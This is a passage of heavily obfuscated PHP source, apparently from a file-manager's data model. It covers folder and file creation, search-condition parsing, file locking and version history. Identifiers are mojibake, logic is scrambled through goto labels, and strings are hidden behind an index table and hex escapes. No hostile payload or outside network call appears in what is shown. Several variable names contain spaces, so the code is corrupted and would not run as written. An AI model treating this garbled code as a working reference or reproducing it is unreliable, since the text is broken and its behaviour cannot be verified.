AäŠ²ØŠÜª; Aåò«øï‡‰: $bœ´İá¹«¥ = array($D–Í¼êÇ¬ö[461] => array($D–Í¼êÇ¬ö[752], $aîö²Ÿæ‘[$D–Í¼êÇ¬ö[461]] . $aîö²Ÿæ‘[$D–Í¼êÇ¬ö[369]] . $D–Í¼êÇ¬ö[486])); $F±æŸ§‘ê” = $this->field($D–Í¼êÇ¬ö[369])->cache(null, 600)->where($bœ´İá¹«¥)->count(); if ($F±æŸ§‘ê” > $d¨Áİ»¨”Ì) { return $this->_listSearchChildrenNear($DŸ¦±Ü¢…, $d¨Áİ»¨”Ì); } goto b¶ßõ‰Ã£¨; b¶ßõ‰Ã£¨: $DÒÅ¬Ç‰Î„ = $this->field($D–Í¼êÇ¬ö[369])->where($bœ´İá¹«¥)->select(); $Bù¦éŠà°’ = array_to_keyvalue($DÒÅ¬Ç‰Î„, $D–Í¼êÇ¬ö[33], $D–Í¼êÇ¬ö[369]); return $Bù¦éŠà°’; goto CÜÍøÇŒ»; AäŠ²ØŠÜª: $D–Í¼êÇ¬ö =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Bù¦éŠà°’ = array(); $aîö²Ÿæ‘ = $this->sourceInfo($DŸ¦±Ü¢…); goto Aåò«øï‡‰; CÜÍøÇŒ»: } private function _listSearchChildrenNear($a§ğå³ëÒø, $E©Íƒ•ÁÜ) { goto Cí‰Á’¶‡Ä; F‚„×Î¶á°: if (!$Dæˆ—ãÃÅŸ) { return $D¥²Ï²êì–; } $eÔ¨ß«ÅäÂ = array($D‚Òİç’¯°[463] => array($D‚Òİç’¯°[7], $Dæˆ—ãÃÅŸ)); $FèÁ®Ö˜›Ï = $this->field($D‚Òİç’¯°[2340])->where($eÔ¨ß«ÅäÂ)->select(); goto bÌ”°œŠ; bÌ”°œŠ: $D¥²Ï²êì– = array_merge($D¥²Ï²êì–, array_to_keyvalue($FèÁ®Ö˜›Ï, $D‚Òİç’¯°[33], $D‚Òİç’¯°[369])); $D¥²Ï²êì– = array_slice($D¥²Ï²êì–, 0, $E©Íƒ•ÁÜ); return $D¥²Ï²êì–; goto AÃß¤Ş; E‘³Ğ¼†Ç: $FèÁ®Ö˜›Ï = $this->field($D‚Òİç’¯°[2340])->where($eÔ¨ß«ÅäÂ)->select(); $Dæˆ—ãÃÅŸ = array_to_keyvalue(array_filter_by_field($FèÁ®Ö˜›Ï, $D‚Òİç’¯°[370], $D‚Òİç’¯°[83]), $D‚Òİç’¯°[33], $D‚Òİç’¯°[369]); $D¥²Ï²êì– = array_merge($D¥²Ï²êì–, array_to_keyvalue($FèÁ®Ö˜›Ï, $D‚Òİç’¯°[33], $D‚Òİç’¯°[369])); goto F‚„×Î¶á°; Cí‰Á’¶‡Ä: $D‚Òİç’¯° =& $_SERVER[´Ù×Íå‘ÄõÛ]; $D¥²Ï²êì– = array(); $eÔ¨ß«ÅäÂ = array($D‚Òİç’¯°[463] => $a§ğå³ëÒø); goto E‘³Ğ¼†Ç; AÃß¤Ş: } private function _listSearchBindPinyin($f£ŞÚ¶µâ, &$bÄ“å…Õº‘, &$bß¼«” İù) { goto a‹ÔàïŸƒô; d×Ü…Ô£†: $Dª™§ÄÀÊñ = array(); $bß¼«” İù = str_replace(array($aåáŠ„ìÒ[217], $aåáŠ„ìÒ[50], $aåáŠ„ìÒ[2341]), $aåáŠ„ìÒ[33], $bß¼«” İù); $bß¼«” İù = $aåáŠ„ìÒ[2342] . str_replace($aåáŠ„ìÒ[47], $aåáŠ„ìÒ[2343], $bß¼«” İù); goto dáéÂÒŞâä; A¸ô·˜Îê: $Dª™§ÄÀÊñ[] = array($aåáŠ„ìÒ[2344] => $F¤„«ËŞòÉ, $aåáŠ„ìÒ[917] => $aåáŠ„ìÒ[2197], array($aåáŠ„ìÒ[2345] => $F¤„«ËŞòÉ, $aåáŠ„ìÒ[2346] => array($aåáŠ„ìÒ[7], array($aåáŠ„ìÒ[416], $aåáŠ„ìÒ[415])))); $this->join($AãÓ²ñµ±•); $bÄ“å…Õº‘ = $Dª™§ÄÀÊñ; goto Dá‘¢á±Şß; a‹ÔàïŸƒô: $aåáŠ„ìÒ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!Input::check($f£ŞÚ¶µâ[$aåáŠ„ìÒ[2193]], $aåáŠ„ìÒ[306]) || strlen($f£ŞÚ¶µâ[$aåáŠ„ìÒ[2193]]) < 2) { return; } $AãÓ²ñµ±• = "\x4c\x45\106\124\40\x4a\x4f\111\116\x20{$this->tablePrefix}\151\157\137\x73\157\x75\162\143\x65\137\x6d\x65\164\141\40\155\x65\164\141\40\157\156\40\x73\x6f\x75\x72\143\145\x2e\163\157\165\162\143\x65\x49\x44\x20\75\40\155\145\x74\141\56\163\x6f\x75\x72\143\145\x49\x44"; goto d×Ü…Ô£†; dáéÂÒŞâä: unset($bÄ“å…Õº‘[$aåáŠ„ìÒ[28]]); foreach ($bÄ“å…Õº‘ as $bÏ¨‘Ôô ç => $CÌ¸˜‰Ÿåñ) { $Dª™§ÄÀÊñ[$aåáŠ„ìÒ[2342] . $bÏ¨‘Ôô ç] = $CÌ¸˜‰Ÿåñ; } $F¤„«ËŞòÉ = array($aåáŠ„ìÒ[485], $aåáŠ„ìÒ[2195] . $f£ŞÚ¶µâ[$aåáŠ„ìÒ[2193]] . $aåáŠ„ìÒ[2195]); goto A¸ô·˜Îê; Dá‘¢á±Şß: } private function _parseSearchWhere($eÀ˜îµÎƒƒ) { goto CÈŠ¹Š×Æ; c–•ïÎ·ïÎ: if (isset($eÀ˜îµÎƒƒ[$Eöç§ã¥†Ô[537]])) { $f ğ½’Œš¢[] = array($Eöç§ã¥†Ô[379] => $eÀ˜îµÎƒƒ[$Eöç§ã¥†Ô[537]], $Eöç§ã¥†Ô[378] => $eÀ˜îµÎƒƒ[$Eöç§ã¥†Ô[537]], $Eöç§ã¥†Ô[917] => $Eöç§ã¥†Ô[2197]); } if (isset($eÀ˜îµÎƒƒ[$Eöç§ã¥†Ô[372]])) { $cñ–ÏÄå½ = $eÀ˜îµÎƒƒ[$Eöç§ã¥†Ô[372]]; if ($cñ–ÏÄå½ == $Eöç§ã¥†Ô[76]) { $f ğ½’Œš¢[$Eöç§ã¥†Ô[370]] = 1; } else { if ($cñ–ÏÄå½ == $Eöç§ã¥†Ô[2352]) { $f ğ½’Œš¢[$Eöç§ã¥†Ô[370]] = 0; } else { if ($cñ–ÏÄå½) { $cñ–ÏÄå½ = is_array($cñ–ÏÄå½) ? $cñ–ÏÄå½ : explode($Eöç§ã¥†Ô[47], $cñ–ÏÄå½); $f ğ½’Œš¢[$Eöç§ã¥†Ô[372]] = array($Eöç§ã¥†Ô[384], $cñ–ÏÄå½); $f ğ½’Œš¢[$Eöç§ã¥†Ô[370]] = 0; } } } } if (isset($eÀ˜îµÎƒƒ[$Eöç§ã¥†Ô[463]])) { $aƒ…öŸØ˜Ó = $this->sourceInfo($eÀ˜îµÎƒƒ[$Eöç§ã¥†Ô[463]]); $f ğ½’Œš¢[$Eöç§ã¥†Ô[527]] = array($Eöç§ã¥†Ô[485], $aƒ…öŸØ˜Ó[$Eöç§ã¥†Ô[461]] . $eÀ˜îµÎƒƒ[$Eöç§ã¥†Ô[463]] . $Eöç§ã¥†Ô[486]); } goto eí¢Ìõ½ß; CÈŠ¹Š×Æ: $Eöç§ã¥†Ô =& $_SERVER[´Ù×Íå‘ÄõÛ]; $f ğ½’Œš¢ = array(); if (isset($eÀ˜îµÎƒƒ[$Eöç§ã¥†Ô[703]])) { $f ğ½’Œš¢[$Eöç§ã¥†Ô[107]] = array($Eöç§ã¥†Ô[2347], $eÀ˜îµÎƒƒ[$Eöç§ã¥†Ô[703]]); } goto F×ˆóŠºË¾; eí¢Ìõ½ß: if (isset($eÀ˜îµÎƒƒ[$Eöç§ã¥†Ô[2193]]) && $eÀ˜îµÎƒƒ[$Eöç§ã¥†Ô[2193]]) { $B„Ñƒæ„“Õ = $eÀ˜îµÎƒƒ[$Eöç§ã¥†Ô[2193]]; $A›êÔÛô‰ê = explode($Eöç§ã¥†Ô[50], $B„Ñƒæ„“Õ); if (strlen($B„Ñƒæ„“Õ) > 2 && (substr($B„Ñƒæ„“Õ, 0, 1) == $Eöç§ã¥†Ô[113] && substr($B„Ñƒæ„“Õ, -1) == $Eöç§ã¥†Ô[113]) || substr($B„Ñƒæ„“Õ, 0, 1) == $Eöç§ã¥†Ô[55] && substr($B„Ñƒæ„“Õ, -1) == $Eöç§ã¥†Ô[55]) { $B„Ñƒæ„“Õ = substr($B„Ñƒæ„“Õ, 1, -1); $A›êÔÛô‰ê = array($B„Ñƒæ„“Õ); } $f ğ½’Œš¢[$Eöç§ã¥†Ô[28]] = array($Eöç§ã¥†Ô[485], $Eöç§ã¥†Ô[2195] . $B„Ñƒæ„“Õ . $Eöç§ã¥†Ô[2195]); if (count($A›êÔÛô‰ê) > 1) { $f ğ½’Œš¢[$Eöç§ã¥†Ô[28]] = array(); foreach ($A›êÔÛô‰ê as $A×éš‚ì­÷) { if (!trim($A×éš‚ì­÷)) { continue; } $f ğ½’Œš¢[$Eöç§ã¥†Ô[28]][] = array($Eöç§ã¥†Ô[485], $Eöç§ã¥†Ô[2195] . trim($A×éš‚ì­÷) . $Eöç§ã¥†Ô[2195]); } } } return $f ğ½’Œš¢; goto E÷’Ã±É; F×ˆóŠºË¾: if (isset($eÀ˜îµÎƒƒ[$Eöç§ã¥†Ô[449]])) { $DáŠÓ½˜ì‡ = array($Eöç§ã¥†Ô[2348], $eÀ˜îµÎƒƒ[$Eöç§ã¥†Ô[449]]); if ($f ğ½’Œš¢[$Eöç§ã¥†Ô[107]]) { $f ğ½’Œš¢[$Eöç§ã¥†Ô[107]] = array($f ğ½’Œš¢[$Eöç§ã¥†Ô[107]], $DáŠÓ½˜ì‡, $Eöç§ã¥†Ô[2349]); } else { $f ğ½’Œš¢[$Eöç§ã¥†Ô[107]] = $DáŠÓ½˜ì‡; } } if (isset($eÀ˜îµÎƒƒ[$Eöç§ã¥†Ô[2350]])) { $f ğ½’Œš¢[$Eöç§ã¥†Ô[77]] = array($Eöç§ã¥†Ô[2347], $eÀ˜îµÎƒƒ[$Eöç§ã¥†Ô[2350]]); } if (isset($eÀ˜îµÎƒƒ[$Eöç§ã¥†Ô[2351]])) { $DáŠÓ½˜ì‡ = array($Eöç§ã¥†Ô[2348], $eÀ˜îµÎƒƒ[$Eöç§ã¥†Ô[2351]]); if ($f ğ½’Œš¢[$Eöç§ã¥†Ô[77]]) { $f ğ½’Œš¢[$Eöç§ã¥†Ô[77]] = array($f ğ½’Œš¢[$Eöç§ã¥†Ô[77]], $DáŠÓ½˜ì‡, $Eöç§ã¥†Ô[2349]); } else { $f ğ½’Œš¢[$Eöç§ã¥†Ô[77]] = $DáŠÓ½˜ì‡; } } goto c–•ïÎ·ïÎ; E÷’Ã±É: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($e£™‡¥Ñ„) { $cÓ„ìàä¼ƒ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Eî•³Öšê‹ = Model($cÓ„ìàä¼ƒ[476])->where(array($cÓ„ìàä¼ƒ[1432] => $e£™‡¥Ñ„))->find(); $FŸÂå±ÕÀ = $this->_mkdirRoot(SourceModel::TYPE_USER, $e£™‡¥Ñ„, $Eî•³Öšê‹[$cÓ„ìàä¼ƒ[28]]); $this->userDesktopAdd($FŸÂå±ÕÀ); return $FŸÂå±ÕÀ; } public function userDesktopAdd($f¯¯¾»ÀªÌ) { $AÆò¢ğŠ„Œ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $BéŒ…×…Í = LNG($AÆò¢ğŠ„Œ[2353]); $dô®¼ÖÔ… = $this->mkdir($f¯¯¾»ÀªÌ, $BéŒ…×…Í); $this->metaSet($dô®¼ÖÔ…, $AÆò¢ğŠ„Œ[2354], $AÆò¢ğŠ„Œ[83]); $this->metaSet($f¯¯¾»ÀªÌ, $AÆò¢ğŠ„Œ[2355], $dô®¼ÖÔ…); } public function groupRootAdd($F§äÁôŞ¡È) { $fÌÎŒƒèò =& $_SERVER[´Ù×Íå‘ÄõÛ]; $EĞ“Ä¼‚µÀ = Model($fÌÎŒƒèò[460])->where(array($fÌÎŒƒèò[2189] => $F§äÁôŞ¡È))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $F§äÁôŞ¡È, $EĞ“Ä¼‚µÀ[$fÌÎŒƒèò[28]]); } public function systemRootPathAdd($aŠåÅîˆÁ”) { if ($aŠåÅîˆÁ” != $_SERVER[´Ù×Íå‘ÄõÛ][1093]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $aŠåÅîˆÁ”); } public function userRootRemove($a”Ç‹‹Ã ¿) { $a³òšá£í = $this->sourceRoot(SourceModel::TYPE_USER, $a”Ç‹‹Ã ¿); if (!$a³òšá£í) { return; } $this->remove($a³òšá£í, !1); } public function groupRootRemove($eµ‹£¾Í‘›) { $B†ÜÅéË = $this->sourceRoot(SourceModel::TYPE_GROUP, $eµ‹£¾Í‘›); if (!$B†ÜÅéË) { return; } $this->remove($B†ÜÅéË, !1); } private function _mkdirRoot($d”ççŸ¦™‘, $dÆßŒ°Õ¼Õ, $b¥¿£À­†È) { goto e„†Ï˜­îº; DÀ–âÉòÅÛ: $cù§îÊãÔ‰ = $this->add($D‘«Øá…¼Ô); $eÒš½‹°˜º = array($AÃÑâñŒ[529] => short_id($cù§îÊãÔ‰)); $this->where(array($AÃÑâñŒ[383] => $cù§îÊãÔ‰))->save($eÒš½‹°˜º); goto F®¯ÔÔ¦õË; F®¯ÔÔ¦õË: CacheLock::unlock($Cì±å´÷Ğß); return $cù§îÊãÔ‰; goto eÁ‚‡ƒ¿öƒ; e„†Ï˜­îº: $AÃÑâñŒ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $D‘«Øá…¼Ô = array($AÃÑâñŒ[368] => 0, $AÃÑâñŒ[523] => $d”ççŸ¦™‘, $AÃÑâñŒ[524] => $dÆßŒ°Õ¼Õ, $AÃÑâñŒ[520] => 1, $AÃÑâñŒ[525] => USER_ID, $AÃÑâñŒ[526] => USER_ID, $AÃÑâñŒ[521] => $AÃÑâñŒ[33], $AÃÑâñŒ[527] => $AÃÑâñŒ[472], $AÃÑâñŒ[396] => 0, $AÃÑâñŒ[522] => 0, $AÃÑâñŒ[420] => 0, $AÃÑâñŒ[528] => $AÃÑâñŒ[33]); if ($D¡‚¯Â•äå = $this->where($D‘«Øá…¼Ô)->find()) { return $D¡‚¯Â•äå[$AÃÑâñŒ[369]]; } goto DÍ›ÅêÄ¹; DÍ›ÅêÄ¹: $Cì±å´÷Ğß = "\x4d\157\144\x65\x6c\123\x6f\x75\162\x63\145\x2e\x6d\153\x64\x69\162\122\x6f\157\x74\56{$d”ççŸ¦™‘}\56{$dÆßŒ°Õ¼Õ}\56" . $b¥¿£À­†È; CacheLock::lock($Cì±å´÷Ğß); $D‘«Øá…¼Ô[$AÃÑâñŒ[28]] = $b¥¿£À­†È; goto DÀ–âÉòÅÛ; eÁ‚‡ƒ¿öƒ: } private function sourceRoot($dÀÆá¤×‰£, $DÆ‡šƒÚÙÍ, $D†Ï–ì ¿› = false) { $BáÛ˜•ª¹· =& $_SERVER[´Ù×Íå‘ÄõÛ]; $F‹…‘”‡æ¯ = array($BáÛ˜•ª¹·[368] => 0, $BáÛ˜•ª¹·[523] => $dÀÆá¤×‰£, $BáÛ˜•ª¹·[524] => $DÆ‡šƒÚÙÍ); if ($aÔ¤´×Éİ = $this->where($F‹…‘”‡æ¯)->find()) { return $D†Ï–ì ¿› ? $aÔ¤´×Éİ : $aÔ¤´×Éİ[$BáÛ˜•ª¹·[369]]; } return !1; } public function sourceRootGroup($fÍå–İ£Ê) { $cäŒµè’Ï =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (is_string($fÍå–İ£Ê)) { $fÍå–İ£Ê = array($fÍå–İ£Ê); } $C†ƒ™†Ş† = array($cäŒµè’Ï[368] => 0, $cäŒµè’Ï[523] => SourceModel::TYPE_GROUP, $cäŒµè’Ï[524] => array($cäŒµè’Ï[7], $fÍå–İ£Ê)); $EÜ‡®Ç¿ƒ = $this->listSource($C†ƒ™†Ş†, 1000); return array_to_keyvalue($EÜ‡®Ç¿ƒ[$cäŒµè’Ï[74]], $cäŒµè’Ï[458]); } public function mkfile($CÌƒ¶ŞÖòÖ, $EÓÉË®µöÆ, $c›ÁÂÚà¢‹ = '', $Dçµ±èÆ–î = REPEAT_RENAME) { $Aò×Çù™îŞ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $dÃ’¿Èğ÷Ù = Model($Aò×Çù™îŞ[546])->addFileByContent($c›ÁÂÚà¢‹, $EÓÉË®µöÆ); return $this->_createFileCall($CÌƒ¶ŞÖòÖ, $EÓÉË®µöÆ, $dÃ’¿Èğ÷Ù, $Dçµ±èÆ–î, $Aò×Çù™îŞ[1130]); } public function addFile($FåÌÈ¯Áñ, $bø„Ì–ˆò½, $b­Ëäí, $C¼óÊ´Æ« = false, $aÉ‰Ö¤ÓŒâ = REPEAT_RENAME) { $C¿Æº×˜ìÌ = Model($_SERVER[´Ù×Íå‘ÄõÛ][546])->addFile($bø„Ì–ˆò½, $b­Ëäí, $C¼óÊ´Æ«); return $this->_createFileCall($FåÌÈ¯Áñ, $b­Ëäí, $C¿Æº×˜ìÌ, $aÉ‰Ö¤ÓŒâ); } public function addFileByFileID($bô³ò³Ğó‚, $D¿ôÄõšæ¹, $CÍù£—Ş‡×, $c•¯”¡Ğà = REPEAT_RENAME) { $EøÅ³¥¦ê =& $_SERVER[´Ù×Íå‘ÄõÛ]; $eèÁ­‰šˆ = Model($EøÅ³¥¦ê[546])->find($D¿ôÄõšæ¹); Model($EøÅ³¥¦ê[546])->linkAdd($D¿ôÄõšæ¹); return $this->_createFileCall($bô³ò³Ğó‚, $CÍù£—Ş‡×, $eèÁ­‰šˆ, $c•¯”¡Ğà); } public function addFileByRemote($DŞ™›š“£, $A‡ÌóŠ˜ì, $aòóâ„Ä––, $b×¡­öŸÀî = array(), $E…óÄØ›¼Á = REPEAT_RENAME) { $AíÔÏ§è÷ª = Model($_SERVER[´Ù×Íå‘ÄõÛ][546])->addFileByRemote($A‡ÌóŠ˜ì, $aòóâ„Ä––, $b×¡­öŸÀî); return $this->_createFileCall($DŞ™›š“£, $aòóâ„Ä––, $AíÔÏ§è÷ª, $E…óÄØ›¼Á); } private function _createFileCall($C¤®Ş¡ ±¯, $F‚êÓÄ±ªÅ, $CëÈñì“¬Ç, $dÕ¬‚˜İ–Æ, $c‚ôÀ–›¥º = "\x75\x70\154\x6f\x61\144") { goto cíç´¹¬’ë; dñßíÕ»Õ¿: $A¥Ù›àğ‘œ = $this->_createFile($C¤®Ş¡ ±¯, $F‚êÓÄ±ªÅ, $CëÈñì“¬Ç, $dÕ¬‚˜İ–Æ, $CİôÁÃè…‰); if (!$CİôÁÃè…‰) { Model($AäÕæ¸¦ò¢[422])->remove($CëÈñì“¬Ç[$AäÕæ¸¦ò¢[419]]); } else { if ($A¥Ù›àğ‘œ) { Model($AäÕæ¸¦ò¢[2325])->eventCreate($A¥Ù›àğ‘œ, $c‚ôÀ–›¥º); } } $this->lockWriteEnd($C¤®Ş¡ ±¯, $F‚êÓÄ±ªÅ); goto d»íöš¥Ø‚; d»íöš¥Ø‚: return $A¥Ù›àğ‘œ; goto b®ÚÖÄí»Ñ; cíç´¹¬’ë: $AäÕæ¸¦ò¢ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $CİôÁÃè…‰ = !1; $this->lockWriteStart($C¤®Ş¡ ±¯, $F‚êÓÄ±ªÅ); goto dñßíÕ»Õ¿; b®ÚÖÄí»Ñ: } public function mkdir($CÇÌ¶º‚É, $d¯ÔÚÙ÷Š, $FÏ·ŠìÄ·Æ = REPEAT_SKIP) { goto AÚ£ˆÈË÷; bòÍ½·æ–»: $CŠ°×¯–Ş´ = $this->_addSoure($DÔïÇ©İŸƒ, $Dâ“âÜå¹¨); Model($e¤Øßì…Áå[2325])->eventCreate($CŠ°×¯–Ş´, $e¤Øßì…Áå[1131]); $this->lockWriteEnd($CÇÌ¶º‚É, $d¯ÔÚÙ÷Š); goto bØ®Ÿ£ê‹; AÚ£ˆÈË÷: $e¤Øßì…Áå =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Dâ“âÜå¹¨ = $this->sourceInfo($CÇÌ¶º‚É); if (!$Dâ“âÜå¹¨) { return !1; } goto A‚ÉîÍè¨ô; bØ®Ÿ£ê‹: return $CŠ°×¯–Ş´; goto Eò¬­¥˜¯; A‚ÉîÍè¨ô: $this->lockWriteStart($CÇÌ¶º‚É, $d¯ÔÚÙ÷Š); if ($FÏ·ŠìÄ·Æ !== !1) { $B›»ÓôÛ‘¥ = $this->fileNameExist($CÇÌ¶º‚É, $d¯ÔÚÙ÷Š); if ($B›»ÓôÛ‘¥ && $FÏ·ŠìÄ·Æ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($CÇÌ¶º‚É, $d¯ÔÚÙ÷Š); return $B›»ÓôÛ‘¥; } $d¯ÔÚÙ÷Š = $this->fileNameAuto($CÇÌ¶º‚É, $d¯ÔÚÙ÷Š, $FÏ·ŠìÄ·Æ); } $DÔïÇ©İŸƒ = array($e¤Øßì…Áå[520] => 1, $e¤Øßì…Áå[386] => $d¯ÔÚÙ÷Š, $e¤Øßì…Áå[521] => $e¤Øßì…Áå[33], $e¤Øßì…Áå[420] => 0, $e¤Øßì…Áå[522] => 0); goto bòÍ½·æ–»; Eò¬­¥˜¯: } private function _createFile($D„²ä…Ûß’, $A…ä¶¥Õ¦, $fàñĞ¢…¹Û, $eåáùÌ³¿¶, &$a©½“á°ĞÇ) { goto CÂ½½½–¶Ú; CÂ½½½–¶Ú: $d§ø‰„Áò™ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Dµ•ºæ©Á = $this->sourceInfo($D„²ä…Ûß’); if (!$fàñĞ¢…¹Û || !$Dµ•ºæ©Á) { return !1; } goto B‘¸²à‹í; bâ‘®º¤À‚: $FÜ–—·¿‚Õ = array($d§ø‰„Áò™[520] => 0, $d§ø‰„Áò™[386] => $A…ä¶¥Õ¦, $d§ø‰„Áò™[521] => get_path_ext($A…ä¶¥Õ¦), $d§ø‰„Áò™[420] => $fàñĞ¢…¹Û[$d§ø‰„Áò™[419]], $d§ø‰„Áò™[522] => $fàñĞ¢…¹Û[$d§ø‰„Áò™[77]]); $F’³ÈÕÄ‚Š = $this->_addSoure($FÜ–—·¿‚Õ, $Dµ•ºæ©Á); $this->folderSizeReset($D„²ä…Ûß’); goto e•†—¹ø•Ô; e•†—¹ø•Ô: return $F’³ÈÕÄ‚Š; goto cÁ™‘×ÂÎ›; B‘¸²à‹í: if ($eåáùÌ³¿¶ !== !1) { $b‰ˆ»²Ø = $this->fileNameExist($D„²ä…Ûß’, $A…ä¶¥Õ¦); } $a©½“á°ĞÇ = !0; if ($eåáùÌ³¿¶ && $b‰ˆ»²Ø) { if ($eåáùÌ³¿¶ == REPEAT_SKIP) { $a©½“á°ĞÇ = !1; return $b‰ˆ»²Ø; } else { if ($eåáùÌ³¿¶ == REPEAT_REPLACE) { $cÈ†ÊëØĞ = $this->sourceInfo($b‰ˆ»²Ø); $BÓÚ­ôàĞ± = $this->fileHistory($cÈ†ÊëØĞ, $fàñĞ¢…¹Û[$d§ø‰„Áò™[419]], $fàñĞ¢…¹Û[$d§ø‰„Áò™[77]]); if (!$BÓÚ­ôàĞ±) { $a©½“á°ĞÇ = !1; } else { $this->folderSizeReset($D„²ä…Ûß’); } return $b‰ˆ»²Ø; } else { $A…ä¶¥Õ¦ = $this->fileNameAuto($D„²ä…Ûß’, $A…ä¶¥Õ¦, $eåáùÌ³¿¶, !1); } } } goto bâ‘®º¤À‚; cÁ™‘×ÂÎ›: } protected function fileHistory($AÉŒº¶‹®, $CÚÔ÷ÌÀîÅ, $AÂÅƒøÎÔƒ) { goto CÓ·ùø…ôË; BÉÌÆê™ò: return !0; goto C°ëßØ‹; dåÒÆÜÔ½: Model($eğíÈ¬µ÷[2356])->addHistory($AÉŒº¶‹®); $b®ğè×ôÂ = array($eğíÈ¬µ÷[526] => USER_ID, $eğíÈ¬µ÷[390] => time(), $eğíÈ¬µ÷[419] => $CÚÔ÷ÌÀîÅ, $eğíÈ¬µ÷[77] => $AÂÅƒøÎÔƒ); $this->where(array($eğíÈ¬µ÷[383] => $AÉŒº¶‹®[$eğíÈ¬µ÷[369]]))->save($b®ğè×ôÂ); goto BÉÌÆê™ò; CÓ·ùø…ôË: $eğíÈ¬µ÷ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($AÉŒº¶‹®[$eğíÈ¬µ÷[419]] == $CÚÔ÷ÌÀîÅ) { return !1; } $this->checkLock($AÉŒº¶‹®[$eğíÈ¬µ÷[369]], $CÚÔ÷ÌÀîÅ); goto dåÒÆÜÔ½; C°ëßØ‹: } public function checkLock($E‹Ç”ğĞ»Ø, $e¨â×©Ë) { goto AÂé¸÷©¢—; BÊ½’ˆñ: show_json(LNG($cæ‘èğé’°[2359]) . $cæ‘èğé’°[2360] . LNG($cæ‘èğé’°[2361]) . $cæ‘èğé’°[2362] . $aŞ¼°à¿”õ . $cæ‘èğé’°[2363], !1); goto FÊ½†…œ; Dù¸‚ò Ú: $this->_createFileCall($dÜÍÃ¬Áæ[$cæ‘èğé’°[463]], $f—´İêö¾Œ, $aÓë¹ä™›„, REPEAT_REPLACE, $cæ‘èğé’°[1130]); $f“’ã÷æØ = $dÜÍÃ¬Áæ[$cæ‘èğé’°[417]][$cæ‘èğé’°[483]]; $aŞ¼°à¿”õ = $f“’ã÷æØ[$cæ‘èğé’°[2358]] ? $f“’ã÷æØ[$cæ‘èğé’°[2358]] : $f“’ã÷æØ[$cæ‘èğé’°[28]]; goto BÊ½’ˆñ; AÂé¸÷©¢—: $cæ‘èğé’° =& $_SERVER[´Ù×Íå‘ÄõÛ]; $dÜÍÃ¬Áæ = $this->pathInfo($E‹Ç”ğĞ»Ø); if (!$this->fileIsLock($dÜÍÃ¬Áæ, !0)) { return; } goto Aêñ¨øå´; Aêñ¨øå´: $BÀÒªïªáç = Session::get($cæ‘èğé’°[2357]); $f—´İêö¾Œ = substr($dÜÍÃ¬Áæ[$cæ‘èğé’°[28]], 0, -1 - strlen($dÜÍÃ¬Áæ[$cæ‘èğé’°[160]])) . $cæ‘èğé’°[1394] . $BÀÒªïªáç . $cæ‘èğé’°[91] . $dÜÍÃ¬Áæ[$cæ‘èğé’°[160]]; $aÓë¹ä™›„ = Model($cæ‘èğé’°[546])->find($e¨â×©Ë); goto Dù¸‚ò Ú; FÊ½†…œ: } public function fileIsLock($B›ùÚ‡Ï¢, $dÒ±ÃÍÁ÷è = false) { goto Fáªİê‡Æ; fİìÎÕÓ: return !1; goto DÚÙšì°¤; Fáªİê‡Æ: $AÍƒØƒ¿Àà =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!isset($B›ùÚ‡Ï¢[$AÍƒØƒ¿Àà[417]]) || !$B›ùÚ‡Ï¢[$AÍƒØƒ¿Àà[417]][$AÍƒØƒ¿Àà[480]]) { return !1; } if ($B›ùÚ‡Ï¢[$AÍƒØƒ¿Àà[417]][$AÍƒØƒ¿Àà[480]] != USER_ID) { return !0; } goto AÔÒ’ª‰Î; AÔÒ’ª‰Î: $d¯ƒ¯ÓÊ = $GLOBALS[$AÍƒØƒ¿Àà[6]][$AÍƒØƒ¿Àà[84]][$AÍƒØƒ¿Àà[481]]; if ($B›ùÚ‡Ï¢[$AÍƒØƒ¿Àà[417]][$AÍƒØƒ¿Àà[482]] <= time() - $d¯ƒ¯ÓÊ) { $this->metaSet($B›ùÚ‡Ï¢[$AÍƒØƒ¿Àà[369]], $AÍƒØƒ¿Àà[480], null); $this->metaSet($B›ùÚ‡Ï¢[$AÍƒØƒ¿Àà[369]], $AÍƒØƒ¿Àà[482], null); } if ($dÒ±ÃÍÁ÷è) { $this->metaSet($B›ùÚ‡Ï¢[$AÍƒØƒ¿Àà[369]], $AÍƒØƒ¿Àà[482], time()); } goto fİìÎÕÓ; DÚÙšì°¤: } private function _addSoure($cƒ±ƒÕ­ó, $bàÆ†Ê˜¤¿) { goto dßÆù’ŸÀÕ; dßÆù’ŸÀÕ: $EÌŠ’Ø‡ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $d‡Â½ƒİ¥° = array($EÌŠ’Ø‡[523] => $bàÆ†Ê˜¤¿[$EÌŠ’Ø‡[371]], $EÌŠ’Ø‡[524] => $bàÆ†Ê˜¤¿[$EÌŠ’Ø‡[458]], $EÌŠ’Ø‡[525] => USER_ID, $EÌŠ’Ø‡[526] => USER_ID, $EÌŠ’Ø‡[368] => $bàÆ†Ê˜¤¿[$EÌŠ’Ø‡[369]], $EÌŠ’Ø‡[527] => $bàÆ†Ê˜¤¿[$EÌŠ’Ø‡[461]] . $bàÆ†Ê˜¤¿[$EÌŠ’Ø‡[369]] . $EÌŠ’Ø‡[47], $EÌŠ’Ø‡[396] => 0, $EÌŠ’Ø‡[528] => $EÌŠ’Ø‡[33]); $cƒ±ƒÕ­ó = array_merge($d‡Â½ƒİ¥°, $cƒ±ƒÕ­ó); goto e¡˜Š…ŒÀ«; E·‚©Ş“: $CÃÙ¼êÚõ· = array($EÌŠ’Ø‡[529] => short_id($Fğ¨…®¬ãÑ)); $this->where(array($EÌŠ’Ø‡[383] => $Fğ¨…®¬ãÑ))->save($CÃÙ¼êÚõ·); $this->setNamePinyin($Fğ¨…®¬ãÑ, $cƒ±ƒÕ­ó[$EÌŠ’Ø‡[28]]); 